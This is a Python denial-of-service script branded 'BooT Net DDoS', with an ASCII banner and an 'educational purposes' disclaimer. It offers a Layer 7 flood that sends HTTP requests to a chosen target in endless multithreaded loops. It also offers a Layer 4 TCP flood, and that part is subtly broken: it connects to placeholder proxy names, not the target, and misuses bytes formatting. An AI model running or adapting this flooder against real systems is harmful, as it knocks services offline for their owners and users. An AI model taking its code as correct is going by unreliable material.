import socket
import threading
import time
import requests
from colorama import init, Fore, Style
import sys
init()

def print_ascii_art():
    art = f"""
{Fore.RED}

                        )                                              )               (     (                
   (          *   )  ( /(                    (              *   )   ( /(           )   )\ )  )\ )              
   )\  (     )  /(  )\())  (   (          ( )\            )  /(   )\())   (   ( /(  (()/( (()/(              
 (((_) )\ )  ( )(_))((_)\  ))\  )(    (    )((_)  (    (   ( )(_)) ((_)\   ))\  )\())  /(_)) /(_))   (   (    
 )\___(()/( (_(_())  _((_)/((_)(()\   )\  ((_)_   )\   )\ (_(_())   _((_) /((_)(_))/  (_))_ (_))_    )\  )\   
((/ __|)(_))|_   _| |_  /(_))   ((_) ((_)  | _ ) ((_) ((_)|_   _|  | \| |(_))  | |_    |   \ |   \  ((_)((_)  
 | (__| || |  | |    / / / -_) | '_|/ _ \  | _ \/ _ \/ _ \  | |    | . |/ -_) |  _|   | |) || |) |/ _ \(_-<  
  \___|\_, |  |_|   /___|\___| |_|  \___/  |___/\___/\___/  |_|    |_|\_|\___|  \__|   |___/ |___/ \___//__/  
       |__/                                                                                                  
                                        Code By CyTZero
                                  BooT Net DDoS    
{Style.RESET_ALL}
    """
    print(art)

def print_disclaimer():
    disclaimer = """
DISCLAIMER:
This script is intended for educational purposes and responsible testing only.
Using this script to perform unauthorized actions, such as a Distributed Denial of Service (DDoS) attack or any other malicious activity, is illegal and unethical. Ensure that you have explicit permission from the server owner before performing any tests.

The author of this script accepts no responsibility for any misuse or damage caused by the use of this script. Use it at your own risk and comply with all relevant laws and regulations.
"""
    print(disclaimer)

def loading_animation(duration=5):
    end_time = time.time() + duration
    spinner = ['|', '/', '-', '\\']
    while time.time() < end_time:
        for symbol in spinner:
            sys.stdout.write(f'\rAttack.......... {symbol}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\rLaunch Attack......      \n')
    sys.stdout.flush()

def send_tcp_request(host, port, request_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            s.sendall(b'GET / HTTP/1.1\r\nHost: {}\r\n\r\n'.format(host).encode())
            response = s.recv(1024)
            if b'200' in response:
                print(f"{Fore.GREEN}[{request_id}] TCP request to {host}:{port} responded with: {response[:100].decode(errors='ignore')}{Style.RESET_ALL}")
            elif b'503' in response:
                print(f"{Fore.RED}[{request_id}] TCP request to {host}:{port} responded with: {response[:100].decode(errors='ignore')}{Style.RESET_ALL}")
            else:
                print(f"[{request_id}] TCP request to {host}:{port} responded with: {response[:100].decode(errors='ignore')}")
    except socket.error as e:
        print(f"[{request_id}] TCP request to {host}:{port} failed: {e}")

def send_http_request(url, request_id):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[{request_id}] HTTP request to {url} responded with status code: {response.status_code}{Style.RESET_ALL}")
        elif response.status_code == 503:
            print(f"{Fore.RED}[{request_id}] HTTP request to {url} responded with status code: {response.status_code}{Style.RESET_ALL}")
        else:
            print(f"[{request_id}] HTTP request to {url} responded with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[{request_id}] HTTP request to {url} failed: {e}")

def send_multiple_tcp_requests(host, port, num_requests, proxy_list):
    total_requests = num_requests * 1000 
    while True:
        threads = []
        for i in range(total_requests):
            proxy = proxy_list[i % len(proxy_list)]
            thread = threading.Thread(target=send_tcp_request, args=(proxy, port, i + 1))
            threads.append(thread)
            thread.start()
            time.sleep(0.01) 
        for thread in threads:
            thread.join()  

def send_multiple_http_requests(url, num_requests):
    total_requests = num_requests * 1000  
    while True:
        threads = []
        for i in range(total_requests):
            thread = threading.Thread(target=send_http_request, args=(url, i + 1))
            threads.append(thread)
            thread.start()
            time.sleep(0.01) 
        for thread in threads:
            thread.join() 

if __name__ == "__main__":
    print_ascii_art() 
    print_disclaimer()  
    choice = input("Choose the test: (1) Layer 4 (TCP) (2) Layer 7 (HTTP): ")
    if choice == '1':
        host = input("Enter the IP address or hostname for Layer 4 testing: ")
        port = int(input("Enter the port to test: "))
        num_requests = int(input("Enter the base number of requests: "))
        if num_requests <= 0:
            print("Number of requests must be positive.")
        else:
            proxy_list = [
                "proxy1.example.com",
                "proxy2.example.com",
                "proxy3.example.com",
            ]
            print("Starting Layer 4 test...\n")
            loading_animation()
            try:
                send_multiple_tcp_requests(host, port, num_requests, proxy_list)
            except KeyboardInterrupt:
                print("\nLayer 4 testing stopped by user.")
    elif choice == '2':
        url = input("Target: ")
        num_requests = int(input("Request: "))
        if num_requests <= 0:
            print("Number of requests must be positive.")
        else:
            print("Starting Layer 7 test...\n")
            loading_animation()
            try:
                send_multiple_http_requests(url, num_requests)
            except KeyboardInterrupt:
                print("\nLayer 7 testing stopped by user.")
    else:
        print("Invalid option. Please choose 1 or 2.") 